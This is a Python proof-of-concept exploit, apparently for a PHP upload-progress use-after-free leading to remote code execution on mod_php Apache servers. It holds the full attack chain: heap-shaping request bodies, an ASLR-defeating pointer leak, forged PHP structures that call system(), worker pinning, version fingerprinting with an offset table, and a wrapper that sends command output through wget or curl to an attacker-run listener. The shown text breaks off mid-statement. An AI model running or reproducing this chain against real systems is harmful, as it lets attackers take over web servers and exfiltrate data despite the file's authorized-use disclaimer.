#!/usr/bin/env python3
"""
php2shell.py — single-file, fully-remote PoC for CVE-2026-109618 / CVE-2026-109619
(PHP session.upload_progress OOM Use-After-Free -> RCE).

Consolidated from 9bie/php2shell-bypass-aslr-exp (exploit.py + pure/{mk_a1,
mk_leak_b, cheap_oom_a, mk_ht, fake_ref_b, chunked_send}) into ONE file with NO
local helper dependencies.

Changes vs. the original, made for authorized internal-target testing:
  * Out-of-band (OOB) proof: the file starts a local HTTP listener and runs the
    supplied --cmd on the target as  sh -c '<cmd> | base64 | curl -> listener',
    so the COMMAND OUTPUT (id, cat /etc/version, ...) comes back over the
    network.  NOTHING is written to the target's disk and no /out/ volume,
    writable webroot, or local proof file is required.
  * Single worker pinning method retained (official prefork MaxRequestWorkers).

AUTHORIZED USE ONLY.  Run only against systems you own or are explicitly
permitted to test.  Calibrated for the official php:8.4.26-apache build
(Debian trixie, Apache 2.4.69 prefork, mod_php 8.4.26 NTS).  Other PHP builds
need --zif-offset/--dtor-offset recalibration.

Examples (lab):
  python3 php2shell.py --port 18110 --oob-host 172.17.0.1 --cmd 'id'
  python3 php2shell.py --port 18110 --oob-host 172.17.0.1 --cmd 'cat /etc/os-release'
Internal target (attacker host 10.0.0.5 reachable from target):
  python3 php2shell.py --host 10.0.4.21 --port 80 --oob-host 10.0.0.5 \
      --cmd 'cat /etc/version'
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import socket
import struct
import sys
import threading
import time
import urllib.parse
from collections import Counter

# --------------------------------------------------------------------------
# Default offsets: official php:8.4.26-apache (the build this chain is tuned
# for).  The bundled OFFSETS_DB covers the last-10 vulnerable official
# php:*-apache builds (Debian-based, mod_php prefork).  Auto-pick via --recon,
# or extract fresh offsets from any non-stripped libphp.so via --extract.
# --------------------------------------------------------------------------
ZIF_OFFSET = 0x465370          # zif_system
DTOR_OFFSET = 0x65EB60         # zval_ptr_dtor

# Bundled offset database (official php:*-apache images, NOT stripped).
# exploit_status:
#   validated                     -> full chain confirmed working end-to-end
#   shapes-carry                  -> 8.4.x heap shapes carry; expected to work
#   needs-shape-recalibration     -> offsets known but the A1/leak heap shapes
#                                    must be re-tuned for this minor line
# Offsets below were EXTRACTED from the actual libphp.so of each official
# php:*-apache image via the built-in --extract engine (pure-stdlib ELF
# parser).  Validated against the live 8.4.26 container (matches nm/readelf).
OFFSETS_DB = {
    "8.4.26": {"zif": 0x465370, "dtor": 0x65EB60, "status": "validated"},
    "8.4.25": {"zif": 0x464C70, "dtor": 0x65DC60, "status": "shapes-carry"},
    "8.4.24": {"zif": 0x464530, "dtor": 0x65D1E0, "status": "shapes-carry"},
    "8.5.11": {"zif": 0x5996E0, "dtor": 0x7B47A0, "status": "needs-shape-recalibration"},
    "8.5.10": {"zif": 0x598D60, "dtor": 0x7B3860, "status": "needs-shape-recalibration"},
    "8.5.9":  {"zif": 0x598160, "dtor": 0x7B29A0, "status": "needs-shape-recalibration"},
    "8.3.35": {"zif": 0x3AC080, "dtor": 0x49EC50, "status": "needs-shape-recalibration"},
    "8.3.33": {"zif": 0x3ABF80, "dtor": 0x49E650, "status": "needs-shape-recalibration"},
    "8.2.34": {"zif": 0x39B8A0, "dtor": 0x487650, "status": "needs-shape-recalibration"},
    "8.2.33": {"zif": 0x39B7A0, "dtor": 0x4870D0, "status": "needs-shape-recalibration"},
    # patched builds (offsets extracted for detection/negative-control only):
    "8.4.27": {"zif": 0x46AD70, "dtor": 0x66A620, "status": "patched"},
    "8.2.35": {"zif": 0x3A1DA0, "dtor": 0x491910, "status": "patched"},
}

# Versions in which the CVEs are fixed -- refuse to exploit these.
PATCHED = {"8.5.12", "8.4.27", "8.3.36", "8.2.35"}

# Heap / ASLR windows.
PTR_MIN = 0x7F0000000000
PTR_MAX = 0x7FFFFFFFFFFF

# libphp is mapped ~0x1A..0x1F0 MB above the main ZendMM chunk; used to reject
# a leak whose most-common pointer is some other repeated value.
DELTA_MIN, DELTA_MAX = 0x1A00000, 0x1F00000

# Stable pointer count in the leak window that identifies the main chunk.
MAIN_BUCKET_COUNT = 87

# Query string that shifts A1's END allocations into the calibrated slot.
QUERY = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"

# B1 leak field spec: 14x full-chunk forge, 1x hole-leaving forge, 1x full,
# then 900 nested-array fields whose real HashTable pDestructor=zval_ptr_dtor.
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])

BOUNDARY = b"C" * 10


# ==========================================================================
# Body builders (inlined from pure/*.py)
# ==========================================================================

def _part(name: bytes, value: bytes = b"", filename: bytes | None = None,
          ctype: bytes | None = None, boundary: bytes = BOUNDARY) -> bytes:
    out = bytearray(b"--" + boundary +
                    b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
    if filename is not None:
        out.extend(b"; filename=\"" + filename + b"\"")
    out.extend(b"\r\n")
    if ctype is not None:
        out.extend(b"Content-Type: " + ctype + b"\r\n")
    out.extend(b"\r\n" + value + b"\r\n")
    return bytes(out)


def _nest_name(i: int, depth: int, key_pad: int) -> bytes:
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def build_a1(parts=860, depth=64, key_pad=90, fillers128=14, big=78,
             big_len=8000, burners=20, burner_len=4000, progress_len=4000) -> bytes:
    """A1: END-cleanup send_cookie OOM body (inlined pure/mk_a1.py).

    Byte-exact vs. mk_a1.py: the nested empty-file parts have NO trailing value
    CRLF -- the header block ends at the blank line and the next boundary follows
    immediately, so the part has an empty body.  Using the generic _part() here
    adds a stray \r\n and shifts the calibrated OOM shape (leak then fails).
    """
    out = bytearray()
    out += _part(b"PHPSESSID", bytes.fromhex("00"))
    for i in range(parts):
        mixed, mixed2 = (i == 0), (i == 1)
        ctype = b"C" * 103 if mixed else (b"C" * 231 if mixed2 else b"application/octet-stream")
        out += (b"--" + BOUNDARY +
                b"\r\nContent-Disposition: form-data; name=\"" +
                _nest_name(i, depth, key_pad) + b"\"; filename=\"" +
                (b"A" if (mixed or mixed2) else b"") +
                b"\"\r\nContent-Type: " + ctype + b"\r\n\r\n")
    for i in range(fillers128):
        out += _part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        out += _part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        out += _part(("u%02d" % i).encode(), b"U" * burner_len)
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def _tag8(idx: int, tagged: bool) -> bytes:
    return (b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB") if tagged else b"BBBB/BBB"


def _forge_fill_value(pages: int, page: int, fake_len: int, idx: int, tagged: bool) -> bytes:
    """Full-chunk fill value with a fake zend_string header at chunk+page*0x1000."""
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= L:
        struct.pack_into("<I", v, hdr + 0x00, 0)
        struct.pack_into("<I", v, hdr + 0x04, 0x16)
        struct.pack_into("<Q", v, hdr + 0x08, 0)
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)
        v[hdr + 0x18:hdr + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(v)


def build_leak_b(spec: str, fake_len: int = 0xC8000, name_len: int = 120,
                 tagged: bool = True) -> bytes:
    """B1: OOB-read leak body (inlined pure/mk_leak_b.py; G and X items)."""
    out = bytearray()
    out += _part(b"PHPSESSID", b"a")
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    idx = 0
    for item in spec.replace(",", " ").split():
        kind, _, arg = item.partition(":")
        if kind == "G":
            pages_s, _, page_s = arg.partition(":")
            v = _forge_fill_value(int(pages_s, 0), int(page_s, 0), fake_len, idx, tagged)
            name = (b"f%04d" % idx).ljust(name_len, b"f")[:name_len]
            out += _part(name, v)
            idx += 1
        elif kind == "X":
            cnt = int(arg, 0)
            for _ in range(cnt):
                nm = ("x%05d" % idx).encode() + b"[a]" * 12
                out += _part(nm, b"v")
                idx += 1
        else:
            raise ValueError("unsupported spec item %r (only G:/X: used)" % item)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_cheap_oom_a(parts=880, depth=64, fillers=115) -> bytes:
    """A2: cheap-OOM body that leaves PS(http_session_vars) dangling
    (inlined pure/cheap_oom_a.py, default OOM shape + bin-32 fillers)."""
    out = bytearray()
    out += _part(b"PHPSESSID", b"a" * 32)
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(fillers):
        out += _part(("%03d" % i).encode(), b"x")
    # empty-file parts: no trailing value CRLF (byte-exact vs cheap_oom_a.py)
    for i in range(parts):
        out += (b"--" + BOUNDARY +
                b"\r\nContent-Disposition: form-data; name=\"" +
                _nest_name(i, depth, 0) + b"\"; filename=\"\"" +
                b"\r\nContent-Type: application/octet-stream\r\n\r\n")
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_ht(htdata: int, zif: int, cmd: bytes, size: int = 384) -> bytes:
    """Fake zend_array + fake execute_data carrier (byte-exact pure/mk_ht.py).

    NOTE: the fake execute_data overlaps the HashTable header at E=0x20, so its
    zeroed opline/call fields OVERWRITE the nTableSize/pointer packed just above.
    Pack every field exactly as mk_ht.py does so the bytes match.
    """
    ht = bytearray(b"\x00" * size)
    struct.pack_into("<II", ht, 0x00, 1, 7)               # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)   # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)       # arData
    struct.pack_into("<II", ht, 0x18, 1, 1)               # nNumUsed/nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)               # nTableSize/pointer
    struct.pack_into("<Q", ht, 0x28, 0)                   # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif)                 # pDestructor = zif_system
    E = 0x20                                              # fake execute_data at S+0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)               # opline  (overwrites nTableSize)
    struct.pack_into("<Q", ht, E + 0x08, 0)               # call
    struct.pack_into("<Q", ht, E + 0x10, zif)             # return_value
    struct.pack_into("<Q", ht, E + 0x18, 0)               # func
    struct.pack_into("<Q", ht, E + 0x20, 0)               # This.value
    struct.pack_into("<I", ht, E + 0x28, 0)               # This.u1.type_info
    struct.pack_into("<I", ht, E + 0x2C, 1)               # num_args = 1
    struct.pack_into("<Q", ht, E + 0x30, 0)               # prev_execute_data
    struct.pack_into("<Q", ht, E + 0x38, 0)               # symbol_table
    struct.pack_into("<I", ht, E + 0x40, 0)               # call_info
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)   # arg1 value
    struct.pack_into("<I", ht, E + 0x58, 6)               # arg1 IS_STRING
    if len(cmd) > size - 0x98 - 1:
        raise ValueError("command too long for the %d-byte carrier (%d > %d)"
                         % (size, len(cmd), size - 0x98 - 1))
    struct.pack_into("<II", ht, 0x80, 1, 0x106)           # fake zend_string rc=1
    struct.pack_into("<Q", ht, 0x88, 0)                   # h
    struct.pack_into("<Q", ht, 0x90, len(cmd))            # len
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def _fake_ref(ptr: int, rc: int, val_type: int = 0x0107) -> bytes:
    rv = bytearray(32)
    struct.pack_into("<I", rv, 0, rc)
    rv[4] = 0x0A                                        # IS_REFERENCE
    struct.pack_into("<Q", rv, 8, ptr)
    struct.pack_into("<I", rv, 16, val_type)
    return bytes(rv)


def build_fake_ref_b(ht: bytes, ht_addr: int, vl: int = 384, n1: int = 500,
                     n2: int = 495, name_len: int = 10, rc: int = 1,
                     ref_start: int = 8, ref_step: int = 32) -> bytes:
    """B2: spray fake zend_reference values + ht field (inlined pure/fake_ref_b.py)."""
    spray = bytearray(b"S" * vl)
    o = ref_start
    while o + 32 <= vl:
        spray[o:o + 32] = _fake_ref(ht_addr, rc)
        o += ref_step
    spray = bytes(spray)

    def nm(prefix: bytes, i: int) -> bytes:
        b = (prefix + ("%09d" % i).encode())
        return (b + b"x" * name_len)[:name_len]

    out = bytearray()
    for i in range(n1):
        out += _part(nm(b"s", i), spray)
    out += _part(b"ht", ht)
    out += _part(b"PHPSESSID", b"a" * 32)
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        out += _part(nm(b"t", i), spray)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


# ==========================================================================
# HTTP transport
# ==========================================================================

def http_post_chunked(host: str, port: int, path: str, body: bytes,
                      timeout: float) -> bytes:
    """Send body with Transfer-Encoding: chunked (bypasses post_max_size)."""
    hdr = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
           % (path, host, port, BOUNDARY.decode())).encode()
    out = bytearray(hdr)
    for i in range(0, len(body), 65536):
        piece = body[i:i + 65536]
        out += ("%x\r\n" % len(piece)).encode() + piece + b"\r\n"
    out += b"0\r\n\r\n"
    return _send_recv(host, port, bytes(out), timeout, cap=4 << 20)


def http_post_plain(host: str, port: int, path: str, body: bytes,
                    timeout: float) -> bytes:
    hdr = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n"
           % (path, host, port, BOUNDARY.decode(), len(body))).encode()
    return _send_recv(host, port, hdr + body, timeout, cap=4 << 20)


def _send_recv(host: str, port: int, data: bytes, timeout: float, cap: int) -> bytes:
    resp = bytearray()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        try:
            s.sendall(data)
            while len(resp) < cap:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp.extend(chunk)
        except OSError:
            pass
        s.close()
    except OSError as exc:
        print("      connect_error %r" % (exc,), file=sys.stderr)
    return bytes(resp)


def hold_workers(host: str, port: int, workers: int, path: str) -> list:
    """Occupy all but one prefork child with incomplete POST bodies so the
    four chain requests land on the same remaining child."""
    holders = []
    if workers <= 1:
        return holders
    n = workers - 1
    for i in range(n):
        try:
            s = socket.create_connection((host, port), timeout=5)
            s.sendall(("POST %s HTTP/1.1\r\nHost: %s\r\n"
                       "Content-Type: application/x-www-form-urlencoded\r\n"
                       "Content-Length: 1048576\r\n\r\nx" % (path, host)).encode())
            holders.append(s)
        except OSError as exc:
            print("      holder %d/%d failed: %r" % (i + 1, n, exc))
            break
        time.sleep(0.01)
    time.sleep(0.8)
    print("      pinned %d/%d workers (%d holders)" % (len(holders) + 1, workers, len(holders)))
    return holders


# ==========================================================================
# Leak parsing
# ==========================================================================

def parse_leak(resp: bytes, dtor_off: int) -> dict:
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        raise RuntimeError("no Set-Cookie in leak response (%d bytes)" % len(resp))
    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if PTR_MIN <= q <= PTR_MAX:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no heap pointers in leak window")
    zdtor, _ = counts.most_common(1)[0]
    lib = zdtor - dtor_off
    buckets = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common() if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - MAIN_BUCKET_COUNT), bc[1]))
    return {"decoded": len(dec), "zdtor": zdtor, "lib": lib, "buckets": buckets,
            "main_candidates": [b for b, _ in cands[:3]]}


# ==========================================================================
# Out-of-band (OOB) proof listener
# ==========================================================================

class OOBListener:
    """Tiny HTTP server that captures the target's command output.

    The target runs:  sh -c '<cmd> | base64 -w0 | curl -s http://OOB/<b64>'
    so the base64 of the command output arrives as the request path.
    """

    def __init__(self, bind: str, port: int):
        self.bind, self.port = bind, port
        self.result = None
        self.hit_path = None
        self._stop = threading.Event()
        self._srv = None
        self._thread = None

    def start(self) -> None:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.bind, self.port))
        srv.listen(16)
        srv.settimeout(0.5)
        self._srv = srv
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self) -> None:
        while not self._stop.is_set():
            try:
                c, addr = self._srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(c, addr), daemon=True).start()

    def _handle(self, c: socket.socket, addr) -> None:
        try:
            c.settimeout(5)
            data = c.recv(65536)
            path = data.split(b"\r\n", 1)[0]
            # e.g. b"GET /aWQ9MzM... HTTP/1.1"
            parts = path.split(b" ")
            if len(parts) >= 2:
                tok = parts[1].lstrip(b"/")
                self.hit_path = tok.decode("latin1", "replace")
                pad = b"=" * (-len(tok) % 4)
                try:
                    raw = base64.urlsafe_b64decode(tok + pad)
                    self.result = raw.decode("utf-8", "replace")
                except Exception:
                    self.result = self.hit_path  # not b64; store raw path
            c.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 2\r\n\r\nok")
        except Exception:
            pass
        finally:
            try:
                c.close()
            except OSError:
                pass

    def stop(self) -> None:
        self._stop.set()
        try:
            if self._srv:
                self._srv.close()
        except OSError:
            pass


def build_oob_cmd(cmd: str, oob_host: str, oob_port: int) -> str:
    """Wrap the operator command so its OUTPUT is exfiltrated to the listener
    as base64 in the URL path.  Minimal form (wget is in the php:*-apache image,
    curl usually too).  Keeps the carrier command as short as possible."""
    # B=$(<cmd>|base64|tr -d '\n'); fetch http://OOB/$B via wget or curl (both
    # present in the official php:*-apache image).  Kept under the carrier budget.
    sh = ("B=$(%s|base64|tr -d '\\n');"
          "wget -qO- %s:%d/$B||curl -s %s:%d/$B"
          % (cmd, oob_host, oob_port, oob_host, oob_port))
    return "sh -c %s" % sh_quote(sh)


def sh_quote(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"


# ==========================================================================
# Recon + offset resolution + ELF extraction
# ==========================================================================

def recon(host: str, port: int, path: str, timeout: float = 6.0) -> dict:
    """Passive fingerprint: Server / X-Powered-By headers + PHP version."""
    hdr = ("GET %s HTTP/1.0\r\nHost: %s:%d\r\nConnection: close\r\n\r\n"
           % (path, host, port)).encode()
    raw = _send_recv(host, port, hdr, timeout, cap=1 << 16)
    head = raw.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
    info = {"server": "", "x_powered_by": "", "php_version": "",
            "sapi_hint": "unknown"}
    for line in head.split("\r\n"):
        if line.lower().startswith("server:"):
            info["server"] = line.split(":", 1)[1].strip()
        elif line.lower().startswith("x-powered-by:"):
            info["x_powered_by"] = line.split(":", 1)[1].strip()
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", info["x_powered_by"])
    if m:
        info["php_version"] = m.group(1)
    # mod_php typically advertises PHP in X-Powered-By with an Apache server;
    # FPM setups (nginx, or Apache+php-fpm) usually do not expose mod_php.
    if "apache" in info["server"].lower() and info["php_version"]:
        info["sapi_hint"] = "likely mod_php (apache + X-Powered-By)"
    elif "nginx" in info["server"].lower():
        info["sapi_hint"] = "likely PHP-FPM (nginx) -- this chain will NOT work"
    return info

def resolve_offsets(args) -> tuple:
    """Decide (zif_offset, dtor_offset, note) for the target."""
    # 1) explicit CLI flags win
    if args.zif_offset is not None and args.dtor_offset is not None:
        return args.zif_offset, args.dtor_offset, "cli"
    # 2) recon + DB auto-pick
    ver = ""
    if args.recon or args.php_version:
        if args.php_version:
            ver = args.php_version
        else:
            r = recon(args.host, args.port, args.path)
            ver = r["php_version"]
            print("[*] recon: Server=%r X-Powered-By=%r -> PHP %s (%s)"
                  % (r["server"], r["x_powered_by"], ver or "?", r["sapi_hint"]))
        if ver in PATCHED:
            print("[-] PHP %s is PATCHED against CVE-2026-109618/109619; refusing."
                  % ver)
            sys.exit(3)
        if ver in OFFSETS_DB:
            e = OFFSETS_DB[ver]
            print("[*] offset DB hit for PHP %s: zif=%#x dtor=%#x [%s]"
                  % (ver, e["zif"], e["dtor"], e["status"]))
            if e["status"] == "needs-shape-recalibration":
                print("    WARNING: offsets known, but the A1 OOM does NOT land in "
                      "session-init on this minor line (OOM fires too late, no dangling "
                      "PS(id) -> B1 leak returns a normal session id).  Confirmed on "
                      "8.3.35; fill-volume scaling does not fix it.  Needs per-build "
                      "heap-shape recalibration (see SHAPE_RECAL_NOTES.md).  Only 8.4.x "
                      "is currently validated.")
            return e["zif"], e["dtor"], "db(%s)" % ver
        if ver:
            print("[!] PHP %s not in offset DB; falling back to defaults (likely wrong)."
                  % ver)
    # 3) defaults (8.4.26)
    return ZIF_OFFSET, DTOR_OFFSET, "default(8.4.26)"


# --- pure-stdlib ELF symbol-offset extractor (for --extract / --list-offsets)
_SHT_SYMTAB, _SHT_DYNSYM, _SHN_UNDEF = 2, 11, 0

def _elf_shdrs(data: bytes):
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("need a 64-bit little-endian ELF")
    e_shoff, = struct.unpack_from("<Q", data, 0x28)
    e_shentsize, = struct.unpack_from("<H", data, 0x3A)
    e_shnum, = struct.unpack_from("<H", data, 0x3C)
    sh = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        (name, typ, flags, addr, offset, size, link, info, al, entsize) = \
            struct.unpack_from("<IIQQQQIIQQ", data, off)
        sh.append({"type": typ, "offset": offset, "size": size,
                   "link": link, "entsize": entsize})
    return sh

def _elf_str(data: bytes, off: int) -> str:
    return data[off:data.find(b"\x00", off)].decode("latin1", "replace")

def _elf_syms(data: bytes, sh, sec) -> dict:
    str_off = sh[sec["link"]]["offset"]
    out = {}
    for i in range(sec["size"] // sec["entsize"]):
        off = sec["offset"] + i * sec["entsize"]
        st_name, st_info, st_other, st_shndx, st_value, st_size = \
            struct.unpack_from("<IBBHQQ", data, off)
        if st_name and st_shndx != _SHN_UNDEF:
            nm = _elf_str(data, str_off + st_name)
            if nm and nm not in out:
                out[nm] = st_value
    return out

def elf_php_offsets(so_path: str) -> dict:
    """Extract {zif_offset, dtor_offset} from a libphp.so (needs .symtab)."""
    data = open(so_path, "rb").read()
    sh = _elf_shdrs(data)
    found = {}
    for sec in sh:
        if sec["type"] in (_SHT_SYMTAB, _SHT_DYNSYM) and sec["entsize"]:
            syms = _elf_syms(data, sh, sec)
            for w in ("zif_system", "zval_ptr_dtor"):
                if syms.get(w):
                    found.setdefault(w, syms[w])
    if "zval_ptr_dtor" not in found:
        raise ValueError("zval_ptr_dtor not found (stripped .so?)")
    if "zif_system" not in found:
        raise ValueError("zif_system not found (LOCAL symbol stripped; supply a "
                         "non-stripped build or its debug-info file)")
    return {"zif_offset": found["zif_system"], "dtor_offset": found["zval_ptr_dtor"]}


# ==========================================================================
# Exploit driver
# ==========================================================================

def run_chain(args) -> int:
    zif_off, dtor_off, src = resolve_offsets(args)
    print("[*] offsets: zif=%#x dtor=%#x  (source=%s)" % (zif_off, dtor_off, src))

    oob = None
    if not args.no_oob:
        oob = OOBListener(args.listen, args.oob_port)
        oob.start()
        print("[*] OOB listener on %s:%d (command output will be exfiltrated here)"
              % (args.listen, args.oob_port))

    if args.no_oob:
        run_cmd = args.cmd
    else:
        run_cmd = build_oob_cmd(args.cmd, args.oob_host, args.oob_port)
    print("[*] target cmd: %s" % args.cmd)

    holders = hold_workers(args.host, args.port, args.workers, args.path)
    try:
        for attempt in range(1, args.retries + 1):
            # warm the pinned child
            try:
                s = socket.create_connection((args.host, args.port), timeout=5)
                s.sendall(("GET %s HTTP/1.0\r\nHost: x\r\n\r\n" % args.path).encode())
                s.recv(1024)
                s.close()
            except OSError:
                pass

            print("[try %d] A1: END-cleanup send_cookie OOM" % attempt)
            http_post_chunked(args.host, args.port, args.path + QUERY,
                              build_a1(), 180)
            time.sleep(0.2)

            print("[try %d] B1: stale-id OOB read (chunk base + libphp)" % attempt)
            resp = http_post_chunked(args.host, args.port, args.path,
                                     build_leak_b(LEAK_SPEC), args.timeout)
            try:
                info = parse_leak(resp, dtor_off)
            except Exception as exc:
                print("      leak failed: %r" % (exc,))
                continue
            print("      decoded=%d zval_ptr_dtor=%#x -> libphp=%#x"
                  % (info["decoded"], info["zdtor"], info["lib"]))
            print("      chunk buckets: %s"
                  % [(hex(b), c) for b, c in info["buckets"].most_common(6)])
            if not info["main_candidates"]:
                print("      no main-chunk candidate")
                continue
            main = info["main_candidates"][0]
            delta = info["lib"] - main
            if not (DELTA_MIN <= delta <= DELTA_MAX):
                print("      implausible libphp-main delta %#x; re-leak" % delta)
                continue

            zif = info["lib"] + zif_off
            for cand in info["main_candidates"]:
                S = cand + 0xF8398
                print("[try %d] A2 + B2: main=%#x S=%#x zif_system=%#x"
                      % (attempt, cand, S, zif))
                http_post_plain(args.host, args.port, args.path,
                                build_cheap_oom_a(), 120)
                time.sleep(0.2)
                ht = build_ht(S, zif, run_cmd.encode(), size=args.ht_size)
                http_post_plain(args.host, args.port, args.path,
                                build_fake_ref_b(ht, S, vl=args.ht_size), 120)

                # wait for OOB proof
                if oob is not None:
                    deadline = time.time() + args.oob_wait
                    while time.time() < deadline and oob.result is None:
                        time.sleep(0.2)
                    if oob.result is not None:
                        print("\n[+] RCE CONFIRMED (out-of-band) — command output:")
                        print("    " + "\n    ".join(oob.result.rstrip("\n").split("\n")))
                        return 0
                    print("      candidate fired (no OOB output yet)")
                else:
                    print("      B2 sent (blind mode, --no-oob): command dispatched")
                    return 0
        print("\n[-] all attempts failed")
        return 1
    finally:
        for s in holders:
            try:
                s.close()
            except OSError:
                pass
        if oob is not None:
            # brief grace so a late OOB hit is still captured
            if oob.result is None:
                time.sleep(1.0)
                if oob.result is not None:
                    print("\n[+] RCE CONFIRMED (out-of-band, late) — command output:")
                    print("    " + "\n    ".join(oob.result.rstrip("\n").split("\n")))
            oob.stop()


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Single-file php2shell PoC (CVE-2026-109618/109619) with OOB proof")
    ap.add_argument("--host", default="127.0.0.1", help="target host (default 127.0.0.1)")
    ap.add_argument("--port", type=int, default=18110, help="target port")
    ap.add_argument("--path", default="/index.php", help="vulnerable PHP path")
    ap.add_argument("--workers", type=int, default=150,
                    help="prefork MaxRequestWorkers (1 = single-worker lab)")
    ap.add_argument("--cmd", default="id",
                    help="command to run on the target (default: id)")
    ap.add_argument("--timeout", type=float, default=600.0)
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                    help="zif_system offset (overrides DB/recon)")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
                    help="zval_ptr_dtor offset (overrides DB/recon)")
    ap.add_argument("--recon", action="store_true",
                    help="fingerprint target via headers and auto-pick offsets "
                         "from the bundled DB (8.4.x validated)")
    ap.add_argument("--php-version", default="",
                    help="skip recon; pick offsets for this PHP version (e.g. 8.4.25)")
    ap.add_argument("--extract", metavar="LIBPHP.SO",
                    help="offline: extract offsets from a libphp.so and exit")
    ap.add_argument("--list-offsets", action="store_true",
                    help="offline: print the bundled offset database and exit")
    # OOB options
    ap.add_argument("--oob-host", default="172.17.0.1",
                    help="attacker IP reachable FROM the target (default 172.17.0.1)")
    ap.add_argument("--oob-port", type=int, default=8888, help="listener port")
    ap.add_argument("--listen", default="0.0.0.0", help="listener bind address")
    ap.add_argument("--oob-wait", type=float, default=6.0,
                    help="seconds to wait for OOB output per candidate")
    ap.add_argument("--no-oob", action="store_true",
                    help="blind mode: run --cmd as-is, do not exfiltrate output")
    ap.add_argument("--ht-size", type=int, default=384,
                    help="ADVANCED: fake-array carrier size.  Keep 384 -- it is tied "
                         "to the calibrated spray heap shape; the OOB wrapper is kept "
                         "short so normal commands fit.  Only change if you know why.")
    args = ap.parse_args()

    # ---- offline modes (no target contact) --------------------------------
    if args.list_offsets:
        print("Bundled offset database (official php:*-apache images, Debian, "
              "mod_php prefork, NON-stripped):")
        print("  %-8s  %-12s  %-12s  %s" % ("version", "zif_system", "zval_ptr_dtor",
                                              "status"))
        def _vkey(v):
            return tuple(int(x) for x in v.split("."))
        for ver in sorted(OFFSETS_DB, key=_vkey, reverse=True):
            e = OFFSETS_DB[ver]
            patched = "  [PATCHED]" if ver in PATCHED else ""
            print("  %-8s  %#012x  %#012x  %s%s"
                  % (ver, e["zif"], e["dtor"], e["status"], patched))
        print("\nPatched (chain will not work): %s"
              % ", ".join(sorted(PATCHED, key=_vkey)))
        return 0
    if args.extract:
        try:
            off = elf_php_offsets(args.extract)
        except Exception as exc:
            print("[-] extract failed: %s" % exc)
            return 2
        print("[+] extracted from %s:" % args.extract)
        print("    zif_system     = %#x" % off["zif_offset"])
        print("    zval_ptr_dtor  = %#x" % off["dtor_offset"])
        print("\nUse with: --zif-offset %#x --dtor-offset %#x"
              % (off["zif_offset"], off["dtor_offset"]))
        return 0

    # The OOB wrapper adds overhead; fail early with a clear message if the
    # resulting command cannot fit the calibrated 384-byte carrier.
    if not args.no_oob:
        need = len(build_oob_cmd(args.cmd, args.oob_host, args.oob_port).encode())
        budget = args.ht_size - 0x98 - 1
        if need > budget:
            ap.error("OOB-wrapped --cmd is %d bytes but the carrier holds %d. "
                     "Shorten --cmd (or use --no-oob with your own exfil)."
